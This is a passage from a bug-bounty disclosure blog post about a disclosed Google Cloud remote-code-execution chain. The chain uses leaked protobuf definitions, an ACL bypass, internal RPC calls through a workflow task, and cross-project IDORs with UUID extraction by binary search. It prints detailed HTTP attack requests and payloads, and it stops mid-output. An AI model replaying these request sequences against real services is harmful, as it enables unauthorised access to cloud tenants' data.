---
title: "StubZero: $148,337 RCE in Google Cloud Production"
url: "https://brutecat.com/articles/google-cloud-rce"
fetched_at: 2026-05-23T07:01:06.260276+00:00
source: "brutecat.com"
tags: [blog, raw]
---

# StubZero: $148,337 RCE in Google Cloud Production

Source: https://brutecat.com/articles/google-cloud-rce

What started as a debugging endpoint info leak escalated into full remote code execution on Google Cloud's production environment. Three months later, it happened again. This vulnerability was assigned
CVE-2026-2031
.
This story starts with one of my automated fuzzing tools alerting me about the API
cloudcrmipfrontend-pa.googleapis.com
, as it was responding with status 200 to some suspicious endpoints. On further inspection, the API seems to have several public debugging endpoints:
Screenshot from an internal API explorer tool I built for testing internal Google APIs from a
discovery document
#
req2proto as a Service™
Some of the endpoints like
GET /v1/integrationPlatform:listServicesByServer
seemed to always return internal server error. However, the endpoint
/v1/integrationPlatform:getProtoDefinition
seemed to return the proto definitions of
any protobuf message in google3
(google's internal source code monorepo), even for unrelated services like YouTube.
Request
GET
/v1/integrationPlatform:getProtoDefinition?fullName=youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext&isEnum=false
HTTP/2
Host
:
cloudcrmipfrontend-pa.clients6.google.com
Cookie
:
<redacted>
Authorization
:
SAPISIDHASH <redacted>
Origin
:
https://console.cloud.google.com
X-Goog-Api-Key
:
AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
For authentication with this API, we are using Google's proprietary first-party authentication. This involves your Google account cookie header along with an
Authorization header value calculated
using the
SAPISID
cookie as well as the whitelisted origin
https://console.cloud.google.com
Response
{
"protoDescriptor"
:
{
"name"
:
"InnerTubeContext"
,
"field"
:
[
{
"name"
:
"client"
,
"number"
:
1
,
"label"
:
"LABEL_OPTIONAL"
,
"type"
:
"TYPE_MESSAGE"
,
"typeName"
:
".youtube.api.pfiinnertube.YoutubeApiInnertube.ClientInfo"
,
"jsonName"
:
"client"
}
,
{
"name"
:
"user"
,
"number"
:
3
,
"label"
:
"LABEL_OPTIONAL"
,
"type"
:
"TYPE_MESSAGE"
,
"typeName"
:
".youtube.api.pfiinnertube.YoutubeApiInnertube.UserInfo"
,
"jsonName"
:
"user"
}
,
...
This was massive, because in Google, everything is proto. All APIs are defined internally as gRPC services using protobuf, and this would essentially allow for disclosing the request/response body of any endpoint, which for a blackbox target like Google is a gold mine.
In the past, I had developed a tool
req2proto
for this purpose, however that tool was limited only to finding the request body proto, not the response body, and it was also with the assumption that the API supported JSPB (application/json+protobuf) which most APIs didn't. As a joke, my friends and I started referring to this endpoint from then onwards as "req2proto as a service", since it was quite literally a hosted, much more powerful version of the tool.
Before probing further with this endpoint, I checked if there were any other endpoints leaking information.
#
Leaking internal workflow execution queue
Initially, without any query parameters set, this endpoint was just returning
INVALID_ARGUMENT
errors. Trying filters like
*
also didn't work. However, from past experience, these filter parameters usually allow any filtering in accordance with
https://google.aip.dev/160
As such, upon trying
client_id>"123"
as the filter, I got an interesting response:
{
"error"
:
{
"code"
:
500
,
"message"
:
"Failed to convert server response to JSON"
,
"status"
:
"INTERNAL"
}
}
It looks like whatever response it was trying to give to me didn't have a JSON mapping. However, Google APIs support changing the response content-type via the standard
?alt=
parameter. For instance,
?alt=proto
would return the output in protobuf.
The only issue is that since we are using Google's proprietary first-party auth for authentication (Cookie and Authorization header), we have to send requests to the hostname
cloudcrmipfrontend-pa.clients6.google.com
instead of
cloudcrmipfrontend-pa.googleapis.com
, but Google does not allow raw proto responses to requests sent to *.google.com:
Request unsafe for browser client domain: cloudcrmipfrontend-pa.clients6.google.com
Thankfully, there's a way around this. We can use the header
X-Goog-Encode-Response-If-Executable: base64
and this would get the response back in base64 instead of binary data:
GET
/v1/integrationPlatform:listQuotaQueue?filter=client_id%3E%22123%22&alt=proto
HTTP/2
Host
:
cloudcrmipfrontend-pa.clients6.google.com
Cookie
:
<redacted>
Authorization
:
SAPISIDHASH <redacted>
Origin
:
https://console.cloud.google.com
X-Goog-Api-Key
:
AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
X-Goog-Encode-Response-If-Executable
:
base64
The API returned a large base64 protobuf response. Using the proto definition leak from earlier to retrieve the schema for
ListQuotaQueueResponse
, I was able to decode it properly which revealed that this was some sort of internal workflow execution queue, which included workflows syncing data from
Spanner
to Salesforce:
{
"queue_items"
:
[
{
"queued_request"
:
{
"queued_request_id"
:
"75a885e2-c611-43f7-b4e2-ae0d87bae789"
,
"client_id"
:
"default"
,
"workflow_name"
:
"WriteToSfdc"
,
"priority"
:
"CRITICAL"
,
"received_timestamp"
:
1763057385562
,
"event_execution_info_id"
:
"615cd9a9-9c0e-46ec-90df-91ee42ec9c37"
}
,
"event_execution_info"
:
{
"client_id"
:
"default"
,
"workflow_name"
:
"WriteToSfdc"
,
"trigger_id"
:
"api_trigger/WriteToSfdc"
,
...
"type_url"
:
"type.googleapis.com/enterprise.crm.datalayer.WriteToSfdcRequest"
,
...
"sfdc_object"
:
{
"vector_account"
:
{
"id"
:
"001Kf00000wjeK3IAI"
,
"due_diligence__c"
:
"Pending"
,
"due_diligence_sub_status__c"
:
"1. PENDING DD - Initial Submission Review"
...
Shortly after this, I filed a report for these vulnerabilities. Just a few hours later, it was marked as P0/S0 and got a 🎉
Nice catch!
#
Escalating further?
After all this, I was convinced there was likely more to be found in this API, so I started looking at all the workflow endpoints. The API seemed to be related to Google Cloud's
Application Integration
.
It allows you to define a "workflow", that you could supply with a
triggerConfig
for what should trigger the workflow, as well as
taskConfig
for what task should be triggered. The most interesting part was that looking at the discovery document, there seemed to be hints of a task called
GenericStubbyTypedTask
that you seemingly could configure the workflow to execute, which instantly set off red flags.
"EnterpriseCrmEventbusProtoTaskUiModuleConfig"
:
{
"description"
:
"Task author would use this type to configure a config module."
,
"id"
:
"EnterpriseCrmEventbusProtoTaskUiModuleConfig"
,
"properties"
:
{
"moduleId"
:
{
"description"
:
"ID of the config module."
,
"enum"
:
[
...
"RPC_TYPED"
,
...
]
,
"enumDescriptions"
:
[
...
"Configures a GenericStubbyTypedTask."
,
...
]
,
}
}
}
,
From
Google's SRE book
:
All of Google’s services communicate using a Remote Procedure Call (RPC) infrastructure named Stubby; an open source version, gRPC, is available. Often, an RPC call is made even when a call to a subroutine in the local program needs to be performed. This makes it easier to refactor the call into a different server if more modularity is needed, or when a server’s codebase grows.
From my understanding on how this works, Borg (aka Google Production) follows a
security model
where every borgtask service has its own identity. When you send a request to a
*.googleapis.com
endpoint, the frontend service makes Stubby calls to backend services using its own prod service identity, while carrying your end-user context in a security ticket. If the ticket contains your Gaia user ID, backend services authorize the request as that user. Here are two examples of leaked security tickets from Google API error responses:
Without authentication (anonymous)
com.google.apps.framework.auth.IamPermissionDeniedException:
  IAM authority does not have the permission 'cloudprivatecatalog.targets.get'
  required for action PrivateCatalogV1Beta1-SearchProducts
  on resource ''.
Explanation:
Security Context:
ValidatedSecurityContextWithSystemAuthorizationPolicy
delegate = ValidatedSecurityContextWithRegistryHandle
delegate = ValidatedSecurityContextWithObligations
delegate = ValidatedIamSecurityContext
user  = anonymous
creds = EndUserCreds
loggable_credential {
type: SERVICE_CONTROL_TOKEN
}
access_assertion: ANONYMOUS
peer =
protocol                = loas
psp_version             = 0
level                   = strong_privacy_and_integrity
host                    = jxcbu6.prod.google.com
is_authenticated_host   = false
role                    = cloud-commerce-catalog
user                    = cloud-boq-clientapi-catalog
is_delegated            = true
jobname_chosen_by_user  = prod.cloud-commerce-catalog
InternalIAMIdentity
log = originator {
scope: MDB_USER
mdb_user {
user_name: "cloud-boq-clientapi-catalog"
}
}
With first-party authentication (Gaia user)
com.google.apps.framework.auth.IamPermissionDeniedException:
  IAM authority does not have the permission 'resourcemanager.projects.get'
  required for action GetServiceAccessStatus
  on resource 'projects/613988253758'.
Explanation:
Security Context:
ValidatedSecurityContextWithCloudPolicyChecks
delegate = ValidatedSecurityContextWithCpeContext
delegate = ValidatedSecurityContextWithObligations
delegate = ValidatedSecurityContextWithRegistryHandle
delegate = ContextWithGaiaMintToken
delegate = ValidatedIamSecurityContext
user  = gaiauser/0xaa22527678
creds = EndUserCreds
loggable_credential {
type: GAIA_MINT
loggable_gaia_mint { }
}
loggable_credential {
type: SERVICE_CONTROL_TOKEN
}
peer =
protocol                = loas
psp_version             = 0
level                   = strong_privacy_and_integrity
host                    = pjf8.prod.google.com
is_authenticated_host   = false
role                    = commerceorggovernance-clh
gaiaId                  = 640201889743
security_realm          = campus-dls
is_delegated            = false
borgcell                = pj
task_id                 = 2
user_type               = MDB_USER_NON_PERSON
jobname_chosen_by_user  = prod.commerceorggovernance-clh
InternalIAMIdentity
log = originator {
scope: GAIA_USER
gaia_user {
user_id: 730720269944
}
}
In both cases, the
peer
block shows the prod service identity making the internal Stubby call. The difference is in the end-user context: the first ticket is
ANONYMOUS
, while the second carries a
GAIA_MINT
credential (when you use cookie or bearer authentication in Google, it's converted to a standard UberMint token which contains an embedded GaiaMint) meaning the backend authorizes the request as that Gaia user. This is so that a call to lets say
/ContactsService.ListContacts
only returns contacts for that authorized user.
If we can perform arbitrary Stubby queries as the integration platform's prod service identity, this would allow us to access a wide variety of RPCs ranging from sensitive user data to code execution depending on the privileges of the prod user. Hence, Google considers this as a massive increase in attack surface and hence
considers this an RCE
.
Often times, even if you can get code execution in a borglet, unless you're particularly interested in what data is processed locally, the main impact is actually access to all of production via Stubby RPCs.
But what actually gates
which
RPCs you can call from a stolen Stubby primitive? Every Stubby service in Google has a defined
RpcSecurityPolicy
with a per-method allowlist. Here's a real one example from the Cloud SQL Speckle Boss process:
mapping
{
rpc_method:
"/SaasActuation.UpdateInstance"
rpc_method:
"/MaintenancePolicyService.CreateMaintenancePolicy"
...
authentication_policy
{
creds_policy
{
rules
{
permissions:
"auth.creds.useProdUserEUC"
action:
ALLOW
in:
"mdb:zamm-exe-3-cloud-sql--default-policy"
in:
"user:speckle-tool-proxy@prod.google.com"
}
rules
{
permissions:
"auth.creds.useLOAS"
action:
ALLOW
in:
"allUsers"
}
    }
  }
authorization_mode:
MANUAL_IAM
permission_to_check:
"cloudsql.instances.rollout"
}
Each
mapping
block lists a set of RPC methods and declares which callers are allowed to invoke them under which credential type. Based on my understanding,
auth.creds.useLOAS
means "any borgtask can call this with its own LOAS identity" while
auth.creds.useProdUserEUC
means "only these specific MDB groups are allowed to forward a Gaia end-user identity (i.e. an UberMint token) into the call".
LOAS (Low Overhead Authentication System) is Google's internal authentication & encryption framework, see
this paper
for more information
The
permission_to_check
then tells the backend which IAM permission to enforce on whatever identity ends up resolved.
So even with a stolen Stubby primitive, you don't actually get to call every RPC under the sun. You can only reach the ones whose
RpcSecurityPolicy
lets your peer identity through. Nevertheless, it is a massive increase in reachable attack surface.
When I initially tried to create a workflow, I got the following
INVALID_ARGUMENT
error:
Request
POST
/v1/integrationPlatform:createDraftWorkflow
HTTP/2
Host
:
cloudcrmipfrontend-pa.clients6.google.com
Cookie
:
<redacted>
Authorization
:
SAPISIDHASH <redacted>
Origin
:
https://console.cloud.google.com
X-Goog-Api-Key
:
AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
Content-Type
:
application/json
Content-Length
:
197
{
"workflow"
: {
"name"
:
"my-new-workflow-test"
,
"origin"
:
"UI"
,
"triggerConfigs"
: [],
"taskConfigs"
: []
  },
"isNewWorkflow"
: true
}
Response
{
"error"
:
{
"code"
:
400
,
"message"
:
"Request contains an invalid argument."
,
"status"
:
"INVALID_ARGUMENT"
}
}
Fun fact: If this request was sent from within Google's intranet, it would dump the full stack trace instead of just a generic error like this.
I suspected that I was likely missing a required argument, possibly
clientId
. Remembering that the listQuotaQueue response from earlier had leaked
"client_id": "default"
, I tried setting that as the
clientId
, and it worked:
Request
POST
/v1/integrationPlatform:createDraftWorkflow
HTTP/2
Host
:
cloudcrmipfrontend-pa.clients6.google.com
Cookie
:
<redacted>
Authorization
:
SAPISIDHASH <redacted>
Origin
:
https://console.cloud.google.com
X-Goog-Api-Key
:
AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
Content-Type
:
application/json
Content-Length
:
197
{
"workflow"
: {
"name"
:
"my-new-workflow-test"
,
"origin"
:
"UI"
,
"clientId"
:
"default"
,
"triggerConfigs"
: [],
"taskConfigs"
: []
  },
"isNewWorkflow"
: true
}
Response:
{
"workflow"
:
{
"workflowId"
:
"53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e"
,
"name"
:
"my-new-workflow-test"
,
"origin"
:
"UI"
,
"creatorEmail"
:
"admin@gvrptest.cry.dev"
,
"createdTime"
:
"2025-12-01T04:19:14.449503Z"
,
"lastModifiedTime"
:
"2025-12-01T04:19:14.449503Z"
,
"status"
:
"DRAFT"
,
"snapshotNumber"
:
"1"
,
"tags"
:
[
"HEAD"
]
,
"lockedBy"
:
"admin@gvrptest.cry.dev"
,
"lockedAtTime"
:
"2025-12-01T04:19:14.449503Z"
,
"lastModifierEmail"
:
"admin@gvrptest.cry.dev"
,
"clientId"
:
"default"
}
}
However, it seemed in order to run a workflow, you had to publish it first, but that's where I got stuck:
Request
POST
/v1/integrationPlatform:publishWorkflow
HTTP/2
Host
:
cloudcrmipfrontend-pa.clients6.google.com
Cookie
:
<redacted>
Authorization
:
SAPISIDHASH <redacted>
Origin
:
https://console.cloud.google.com
X-Goog-Api-Key
:
AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
Content-Type
:
application/json
{
  "workflowId": "53b2a49c-dd5e
-4
e45
-829
b
-61
a3b2e8ff6e"
}
Response
{
"error"
:
{
"code"
:
403
,
"message"
:
"Publisher admin@gvrptest.cry.dev cannot be the same as the last editor admin@gvrptest.cry.dev of the integration my-new-workflow-test with snapshot number 1 and integration ID 53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e being edited from the UI. Please raise a Request to Publish and have your change approved by another person."
,
"status"
:
"PERMISSION_DENIED"
}
}
I had to somehow add another user to the workflow, and use that to publish. At the time, I attempted to use the ACL endpoints to add another account, but wasn't able to get the permissions to work correctly.
#
The DM that changed everything
More than a month after I initially reported it, I was in a discord group chat with a few other researchers, where I jokingly mentioned that I had a bug to leak protobuf definitions within Google:
That's when
shrugged
mentioned that he had the same bug, and our conversation took off.
It turned out that shrugged had also been investigating this very same API when he noticed these endpoints listed in the javascript files for
Application Integration
while researching another bug. He had spotted
GenericStubbyTypedTask
as a potential RCE vector, but was stuck without a valid
client_id
for the initial draft workflow creation.
Meanwhile, I had the
client_id
from the quota queue leak, but was stuck at the publishing step. We quickly traded notes: I shared
client_id: "default"
and where I'd hit the wall, and we picked up from there.
Google had already rolled out fixes from my initial report, so many of the original endpoints were now returning PERMISSION_DENIED. However, we noticed something interesting - many endpoints had 1:1 working counterparts under different service names:
Original (Blocked)
Counterpart
/v1/integrationPlatform:getProtoDefinition
/v1/integrationPlatform/workflowsupport:getProtoDefinition
/v1/integrationPlatform:runWorkflow
/v1/integrationPlatform/workflowexecution:runWorkflow
/v1/integrationPlatform:setAcl
/v1/integrationPlatform/auth:setAcl
The initial fixes had only blocked the original "WorkflowEditorService" endpoints, but not these counterparts. The problem was
createDraftWorkflow
- we couldn't find a counterpart for it, and it was returning PERMISSION_DENIED:
{
"error"
:
{
"code"
:
403
,
"message"
:
"The caller does not have permission"
,
"status"
:
"PERMISSION_DENIED"
}
}
Strangely, when shrugged tried the same request, it worked on his first attempt, while I was consistently getting
PERMISSION_DENIED
. That's when it clicked: the fix hadn't fully propagated across all load balanced backends yet. By repeatedly sending the same request, we could reliably route through a backend that still allowed it through:
HTTP/2
200
OK
Content-Type
:
application/json; charset=UTF-8
{
"workflow"
: {
"workflowId"
:
"c6141c63-ac7a-4350-b582-7615ef045d0c"
,
"name"
:
"retest"
,
"origin"
:
"UI"
,
"creatorEmail"
:
"admin
@gvrptest
.cry.dev"
,
"createdTime"
:
"..."
,
"lastModifiedTime"
:
"..."
,
"status"
:
"DRAFT"
,
"snapshotNumber"
:
"1"
,
"tags"
: [
"HEAD"
],
"lockedBy"
:
"admin
@gvrptest
.cry.dev"
,
"lockedAtTime"
:
"..."
,
"lastModifierEmail"
:
"admin
@gvrptest
.cry.dev"
,
"clientId"
:
"default"
} }
However, the task name GenericStubbyTypedTask didn't seem to exist. Looking at the response of
/v1/integrationPlatform:listTaskEntities
(decoded using the proto definitions from getProtoDefinition), it seemed to only provide tasks with
IO_TEMPLATE
{
"taskEntities"
:
[
{
"metadata"
:
{
"name"
:
"Delete SFDC Record"
,
"descriptiveName"
:
"Delete Salesforce Record"
,
"description"
:
"Deletes a record in Salesforce"
,
"g3DocLink"
:
"https://g3doc.corp.google.com/company/teams/cloudcrm/platform/user_guide/tasks/write_to_sfdc.md#delete-sfdc-record-task"
,
"iconLink"
:
"https://gstatic.com/enterprise/crm/eventbus/images/icons/blue/salesforce_009EDB_48px_1_blue.svg"
,
"codeSearchLink"
:
"https://cs.corp.google.com/piper///depot/google3/java/com/google/enterprise/crm/eventbus/connectors/generic/impl/GenericRestV2TaskImpl.java"
,
...
}
,
"paramSpecs"
:
{
"parameters"
:
[
{
"key"
:
"salesforceDomain"
,
"dataType"
:
"STRING_VALUE"
,
"className"
:
"java.lang.String"
,
"config"
:
{
"descriptivePhrase"
:
"Check in Salesforce: Setup > Company Settings > My Domain. If you don't have My Domain enabled, please use \"yourinstance.salesforce.com\" as the Salesforce domain."
,
"label"
:
"Salesforce domain"
,
"uiPlaceholderText"
:
"e.g. yourDomain.my.salesforce.com"
}
,
"required"
:
1
}
,
...
]
}
,
...
"taskType"
:
"IO_TEMPLATE"
}
,
...
]
}
It seemed like the GenericStubbyTypedTask was likely part of the underlying
ASIS_TEMPLATE
:
{
"taskType"
:
{
"description"
:
"Defines the type of the task"
,
"enum"
:
[
"TASK"
,
"ASIS_TEMPLATE"
,
"IO_TEMPLATE"
]
,
"enumDescriptions"
:
[
"Normal IP task"
,
"Task is of As-Is Template type"
,
"Task is of I/O template type with a different underlying task"
]
,
"type"
:
"string"
}
}
Interestingly, the underlying RPC for this endpoint is
google.internal.cloud.crm.ipfrontend.v1.WorkflowEditorService/ListTaskEntities
. This is eerily similar to the public
Application Integration
product's
/$rpc/google.cloud.integrations.v1alpha.Integrations/ListTaskEntities
though that too didn't return any
ASIS_TEMPLATE
tasks directly.
Looking back at Application Integration's
JS code
from
Cloud Console
:
[
"Vertex AI - Predict"
,
"https://www.gstatic.com/enterprise/crm/eventbus/images/icons/custom_tasks/document_ai.png"
],
[
"GenericStubbyTypedTaskV2"
,
"http://gstatic.com/enterprise/crm/eventbus/images/icons/blue/stubby_48px_blue.svg"
],
[
"RunGoogleSqlPlxQueryTask"
,
"https://fonts.gstatic.com/s/i/productlogos/plx/v6/192px.svg"
],
[
"ConvertDremelResultToJsonTask"
,
"https://www.gstatic.com/images/icons/material/system/2x/settings_googblue_24dp.png"
],
The exact task name was
GenericStubbyTypedTaskV2
, complete with its own icon, no less:
Attempting to configure
GenericStubbyTypedTask
on
Application Integration
returned an error revealing the required fields:
{
"error"
:
{
"code"
:
400
,
"message"
:
"'Required input key serverSpec not present in task GenericStubbyTypedTaskImpl, task number 1.'"
,
"status"
:
"INVALID_ARGUMENT"
}
}
Repeating with each missing key revealed
serverSpec
,
serviceName
, and
serviceMethod
. These same parameters applied to
GenericStubbyTypedTaskV2
. Using
Ezequiel Pereira
's
protobuf repo
as reference and a GSLB address we found leaked in another discovery document, we configured the task to call
/ServerStatus.GetServices
on
gslb:alkali-base
:
Fun fact: Alkali is Google's internal framework that Googlers can use to spin up production APIs with minimal boilerplate, they tend to have a lot of security issues.
HTTP/2
200
OK
Content-Type
:
application/json; charset=UTF-8
{
"workflow"
: {
"workflowId"
:
"f91833bf-eacb-43ac-8490-099fef977e19"
,
"name"
:
"retest-test123"
,
"taskConfigs"
: [{
"taskName"
:
"GenericStubbyTypedTaskV2"
,
"taskNumber"
:
"1"
,
"parameters"
: {
"response"
: {
"key"
:
"response"
,
"value"
: {
"stringValue"
:
"$response$"
},
"dataType"
:
"STRING_VALUE"
},
"serverSpec"
: {
"key"
:
"serverSpec"
,
"value"
: {
"stringValue"
:
"gslb:alkali-base"
},
"dataType"
:
"STRING_VALUE"
},
"serviceName"
: {
"key"
:
"serviceName"
,
"value"
: {
"stringValue"
:
"ServerStatus"
},
"dataType"
:
"STRING_VALUE"
},
"serviceMethod"
: {
"key"
:
"serviceMethod"
,
"value"
: {
"stringValue"
:
"GetServices"
},
"dataType"
:
"STRING_VALUE"
}},
"position"
: {
"x"
:
-716
,
"y"
:
-445
},
"label"
:
"Stubby Internal"
,
"incomingEdgeCount"
:
1
,
"taskType"
:
"ASIS_TEMPLATE"
,
"externalTaskType"
:
"NORMAL_TASK"
}],
"triggerConfigs"
: [{
"startTasks"
: [{
"taskNumber"
:
"1"
}],
"properties"
: {
"Trigger name"
:
"my-api-trigger-123"
},
"triggerType"
:
"API"
,
"triggerNumber"
:
"1"
,
"enabledClients"
: [
"default"
],
"triggerId"
:
"api_trigger/my-api-trigger-123"
}],
"origin"
:
"UI"
,
"creatorEmail"
:
"<REDACTED>"
,
"createdTime"
:
"2026-01-12T09:45:55.896951Z"
,
"lastModifiedTime"
:
"2026-01-12T09:45:55.896951Z"
,
"status"
:
"DRAFT"
,
"snapshotNumber"
:
"1"
,
"tags"
: [
"HEAD"
],
"lockedBy"
:
"<REDACTED>"
,
"lockedAtTime"
:
"2026-01-12T09:45:55.896951Z"
,
"lastModifierEmail"
:
"<REDACTED>"
,
"clientId"
:
"default"
}}
Everything here is strikingly similar to
Application Integration
- the workflow structure, the task configuration, even the publishing and running flow. Notice the
"position": {"x": -716, "y": -445}
in our workflow? The internal UI likely looks very similar to Application Integration's visual workflow editor, where we're essentially setting coordinates for task positions:
Remember the ACL issue that blocked me from publishing earlier? shrugged figured out we could bypass it by updating the ACL for
IP_EVENTBUS_WORKFLOWS
with the obfuscated Gaia ID of two attacker controlled Google accounts.
Request
POST
/v1/integrationPlatform/auth:setAcl
HTTP/2
Host
:
cloudcrmipfrontend-pa.clients6.google.com
Cookie
:
<redacted>
Authorization
:
<redacted>
Origin
:
https://console.cloud.google.com
X-Goog-Api-Key
:
AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
Content-Type
:
application/json
Content-Length
:
500
{
"resourceInfo"
: {
"resource"
:
"IP_EVENTBUS_WORKFLOWS"
,
"id"
:
"retest-test123"
},
"acl"
: {
"entries"
: [{
"scope"
: {
"obfuscatedGaiaId"
:
"100029910836469267942"
},
"role"
:
105
}, {
"scope"
: {
"obfuscatedGaiaId"
:
"113728935872649341310"
},
"role"
:
105
}]}}
Response
HTTP/2
200
OK
Content-Type
:
application/json; charset=UTF-8
{}
First, we toggled the request to publish workflow using the first attacker Google account:
POST
/v1/integrationPlatform/workflowdeployment:toggleRequestToPublishWorkflow
HTTP/2
Host
:
cloudcrmipfrontend-pa.clients6.google.com
...
{"workflowId": "f91833bf-eacb
-43
ac
-8490
-099
fef977e19"}
And then finally publishing the workflow using the second attacker account:
POST
/v1/integrationPlatform/workflowdeployment:publishWorkflow
HTTP/2
Host
:
cloudcrmipfrontend-pa.clients6.google.com
...
{"workflowId": "f91833bf-eacb
-43
ac
-8490
-099
fef977e19"}
Running a workflow configured with
GenericStubbyTypedTaskV2
with
serverSpec
set to
gslb:alkali-base
and service/method set to
/ServerStatus.GetServices
, we were able to
execute the Stubby query
:
...
{
"protoValue"
:
{
"@type"
:
"type.googleapis.com/rpc.ServiceList"
,
"service"
:
[
{
"name"
:
"AlkaliBaseAccountService"
,
"descriptor"
:
{
"filename"
:
"google/internal/alkali/base/v1/alkali_base_account_service.proto"
,
"name"
:
"AlkaliBaseAccountService"
,
"method"
:
[
{
"name"
:
"ListAccounts"
,
"argumentType"
:
"google.internal.alkali.base.v1.ListAccountsRequest"
,
"resultType"
:
"google.internal.alkali.base.v1.ListAccountsResponse"
,
"deadline"
:
30
,
"securityLevel"
:
"none"
}
,
{
"name"
:
"ListAccessibleAccounts"
,
"argumentType"
:
"google.internal.alkali.base.v1.ListAccessibleAccountsRequest"
,
"resultType"
:
"google.internal.alkali.base.v1.ListAccountsResponse"
,
"deadline"
:
30
,
"securityLevel"
:
"none"
}
,
...
We then updated the initial bug with the escalation to RCE. Neither of us could have done this alone, and the timing was clutch: just one hour after our PoC, the fix for
createDraftWorkflow
fully propagated. Any later and this RCE escalation would've stayed theoretical. That being said, we were cut off by Google before we could actually execute code on Google's servers.
#
Timeline (1st RCE)
2025-12-01 - Initial report sent to Google
2025-12-01 - Google triaged report as P0/S0
2025-12-01 - 🎉
Nice catch!
2026-01-12 - Informed Google's security team about the RCE escalation
2026-01-12 - Updated report with RCE PoC
2026-01-12 - Report escalated by Google
2026-01-16 -
Panel awards $60,000
. Rationale for this decision: This report was of exceptional quality! Vulnerability category is "Compromise of Google Cloud Production Environment". Vulnerabilities without any interaction or relationship between attacker and victim. Default Google Cloud products.
#
Round 2 (3 months later)
You thought that was the end of it, not so easy. Three months later, my fuzzer pinged me about some IDORs in the public Application Integration product's
public API
.
Turns out, throughout this whole API, you could reference your own project ID in the URL, but reference someone else's UUID:
GET
/v1/projects/<your-project>/locations/us-central1/integrations/anythinghere/versions/<victim-uuid>
HTTP/2
Host
:
integrations.googleapis.com
Authorization
:
Bearer <redacted>
and the API would happily return the victim's resource, because the authentication check was done on your project ID (you are authorized for your own project), but there was no access control check if the ID was actually tied to your project or not.
However, this by itself wouldn't be too impactful, because these are UUIDv4. The search space is far too large to be meaningfully bruteforce-able (search space of 10^36). Hence, I went looking around for any way I could potentially leak a victim's resource UUIDs.
That's when I noticed this interesting "test cases" feature. From the
documentation
:
With Application Integration, you can create and run multiple test cases on your complex integrations that connect and manage Google Cloud services and other business applications. By testing your integration flow, you can ensure that your integration is working as intended.
The interesting thing was, when you look at how your test cases are loaded in the frontend, the browser sends a request like so:
POST
/$rpc/google.cloud.integrations.v1alpha.TestCases/ListTestCases
HTTP/2
Host
:
us-central1-integrations.clients6.google.com
Content-Type
:
application/x-protobuf
< RAW PROTOBUF DATA >
The actual request payload is in protobuf, I've decoded here so you can see how it looks like:
{
"1"
:
"projects/eastern-camp-489414-j3/locations/us-central1/integrations/RestTaskTest/versions/631a0566-02fc-4dce-b319-25e2c68168f4"
,
"2"
:
"workflow_id = 631a0566-02fc-4dce-b319-25e2c68168f4"
,
"6"
:
{
"1"
:
[
"name"
,
"display_name"
,
"update_time"
,
"client_id"
]
}
}
Field
1
is the parent resource (my project, my version UUID), field
6
is the response field mask, and field
2
,
workflow_id = 631a0566-02fc-4dce-b319-25e2c68168f4
seemed to be some sort of filter. Perhaps if this was omitted, it would return test cases for all workflows? Surely not...
Dropping field
2
and
6
from the request:
{
"1"
:
"projects/eastern-camp-489414-j3/locations/us-central1/integrations/RestTaskTest/versions/631a0566-02fc-4dce-b319-25e2c68168f4"
}
...the response came back with test cases from every other GCP project:
{
"testCases"
:
[
{
"name"
:
"projects/331540621401/locations/us-central1/integrations/my-draft-integration/versions/631a0566-02fc-4dce-b319-25e2c68168f4/testCases/b25fb963-792c-419d-a98b-eb930b2a29e3"
,
"displayName"
:
"test"
,
"triggerId"
:
"api_trigger/AI_bebbia_CreateWOSubs_API_1"
,
"testInputParameters"
:
[
{
"key"
:
"InputData"
,
"dataType"
:
"JSON_VALUE"
,
"defaultValue"
:
{
"jsonValue"
:
"{\n  \"OldSKU\": \"300465\",\n  \"orderid\": \"7fe9ffa9-d122-484b-96df-9ef85cd3aa8a\",\n  ...\n}"
}
,
"displayName"
:
"InputData"
}
]
,
"creatorEmail"
:
"redacted@google.com"
,
...
}
]
}
Looking closer at the response though, you may notice something off. The
versions/...
segment in every result is
631a0566-02fc-4dce-b319-25e2c68168f4
. That's
my
version UUID, the one I sent in field
1
. The API was just reflecting it straight back into every test case's
name
, even though these test cases belong to completely different integrations in different projects.
So while I now had every test case ID across every GCP project, along with their integration names and creator emails, the actual victim version UUIDs which I needed to feed into those IDORs from earlier were nowhere in the response.
That said, the test case IDs alone were already good for some real impact. Application Integration exposes an
:executeTest
endpoint that runs a test case by its ID, and it didn't actually need the victim's real version UUID.
Request
POST
/v1/projects/<your-project>/locations/us-central1/integrations/x/versions/-/testCases/035c64d6-ea04-436d-8674-862f51191953:executeTest
HTTP/2
Host
:
integrations.googleapis.com
Authorization
:
Bearer <redacted>
Content-Length
:
0
Response
{
"executionId"
:
"5d49abed-7692-47aa-8660-5cdaea92d2af"
,
"outputParameters"
:
{
"output"
:
3
}
,
"assertionResults"
:
[
{
"assertion"
:
{
"assertionStrategy"
:
"ASSERT_EQUALS"
,
"parameter"
:
{
"key"
:
"output"
,
"value"
:
{
"intValue"
:
"3"
}
}
}
,
"taskNumber"
:
"1"
,
"taskName"
:
"JsonnetMapperTask"
,
"status"
:
"SUCCEEDED"
}
]
,
"testExecutionState"
:
"PASSED"
}
So I could already trigger arbitrary test cases to execute in any victim's environment, but the real goal was still to access a victim's entire integration through the IDORs from earlier, and for that I needed the actual version UUID.
I was stuck here for a bit. That was, until I had an idea. The
filter
parameter (field
2
) clearly supports comparison operators like
=
. What if it also supports
>
and
<=
? If it does, I could anchor on a known test case ID and then binary search the
workflow_id
field, one hex character at a time, until I'd reconstructed the entire UUID:
id = "<known-tc-uuid>" AND workflow_id > "<low>" AND workflow_id <= "<high>"
Each request narrows the range. If the test case still appears in the response, the real
workflow_id
is in
(low, high]
, otherwise it's outside. A 32-character hex UUID should in theory fall out in around 128 requests.
I had Claude write a PoC for this, and it worked perfectly first try:
$ python extract_by_id.py --token "<redacted>" --project 273897706296 --location "us-central1" --tc-id "60413427-4d07-4c36-bce0-66cfcdd81879"
Test case: 60413427-4d07-4c36-bce0-66cfcdd81879
